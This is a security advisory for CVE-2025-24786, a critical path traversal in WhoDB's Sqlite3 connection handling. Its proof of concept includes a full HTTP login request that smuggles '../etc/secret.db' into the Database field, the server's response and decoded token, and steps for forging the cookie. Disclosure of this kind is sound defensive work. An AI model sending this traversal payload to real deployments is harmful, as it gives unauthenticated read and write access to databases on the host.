# WhoDB has a path traversal opening Sqlite3 database

**GHSA**: GHSA-9r4c-jwx3-3j76 | **CVE**: CVE-2025-24786 | **Severity**: critical (CVSS 10.0)

**CWE**: CWE-22

**Affected Packages**:
- **github.com/clidey/whodb/core** (go): < 0.0.0-20250127172032-547336ac73c8

## Description

### Summary

While the application only displays Sqlite3 databases present in the directory `/db`, there is no path traversal prevention in place. This allows an unauthenticated attacker to open any Sqlite3 database present on the host machine that the application is running on.

### Details

WhoDB allows users to connect to Sqlite3 databases. By default, the databases must be present in `/db/` (or alternatively `./tmp/` if development mode is enabled). Source: https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L14-L20

If no databases are present in the default directory, the UI indicates that the user is unable to open any databases:

![2025-01-22-12-12-42](https://github.com/user-attachments/assets/98ffbcf6-907d-4f90-bf11-2c921b2d93b3)

The database file is an user-controlled value. This value is used in `.Join()` with the default directory, in order to get the full path of the database file to open. Source: https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L26

No checks are performed whether the database file that is eventually opened actually resides in the default directory `/db`.

This allows an attacker to use path traversal (`../../`) in order to open any Sqlite3 database present on the system. 

### PoC

Before running the container, an example Sqlite3 database with dummy "secret" data was created:
```sh
DB_FILE=$(mktemp)
echo "CREATE TABLE secret_table (data TEXT); INSERT INTO secret_table VALUES ('secret data')" | sqlite3 "$DB_FILE"
```

The container was then created with nothing mounted into `/db`, and the dummy database mounted into `/etc/secret.db`:
```sh
podman run -d -p 8080:8080 -v "$DB_FILE":/etc/secret.db docker.io/clidey/whodb
```

The attacker sends a HTTP request to determine whether the `secret.db` is accessible by setting the `Database` value to `../etc/secret.db`:
```http
POST /api/query HTTP/1.1
Host: localhost:8080
content-type: application/json
...

{"operationName":"Login","variables":{"credentials":{"Type":"Sqlite3","Hostname":"","Database":"../etc/secret.db","Username":"","Password":"","Advanced":[]}},"query":"mutation Login($credentials: LoginCredentials!) {\n  Login(credentials: $credentials) {\n    Status\n    __typename\n  }\n}"}
```

The server response indicates that the database was successfully opened:
```http
HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: Token=eyJUeXBlIjoiU3FsaXRlMyIsIkhvc3RuYW1lIjoiIiwiVXNlcm5hbWUiOiIiLCJQYXNzd29yZCI6IiIsIkRhdGFiYXNlIjoiLi4vZXRjL3NlY3JldC5kYiJ9; Path=/; Expires=Thu, 23 Jan 2025 10:35:43 GMT; HttpOnly
...

{"data":{"Login":{"Status":true,"__typename":"StatusResponse"}}}
```

The `Set-Cookie` `Token` value is simply a Base64-encoded string with a JSON payload containing the connection details:
```json
{
  "Type": "Sqlite3",
  "Hostname": "",
  "Username": "",
  "Password": "",
  "Database": "../etc/secret.db"
}
``` 

The attacker may set this cookie in the browser manually (alongside corresponding profiles in Local Storage) in order to open this database in the WhoDB application graphically. An easy way to perform this is by using a HTTP proxy such as Burp Suite, intercepting the login request and swapping the `Database` value to `../etc/secret.db`.

Doing so, the attacker can then browse the database, its tables and the data within:

![2025-01-22-12-36-25](https://github.com/user-attachments/assets/c28f1273-7a3c-49e8-bb73-d08a09c7521d)

The attacker may also insert or modify data using either the buttons presented in the UI or the _Scratchpad_ functionality. In this proof-of-concept, the attacker inserts a new row using the _Add Row_ button:

![2025-01-22-12-36-49](https://github.com/user-attachments/assets/dbd86beb-9969-464c-9a28-a19d470d0f52)

### Impact

Allows an unauthenticated attacker to open and read any Sqlite3 databases present on the system WhoDB is running on. If WhoDB has write permissions for the database file, the attacker is also able to modify the opened database.

The attacker is unable to create new databases; however, files which already exist but have no content (0-length files) may be opened and modified as fresh databases.

### Recommendations

Before attempting to open the database, resolve and normalize the path to the database and check whether it is in the default directory. If not, present the user with an error.
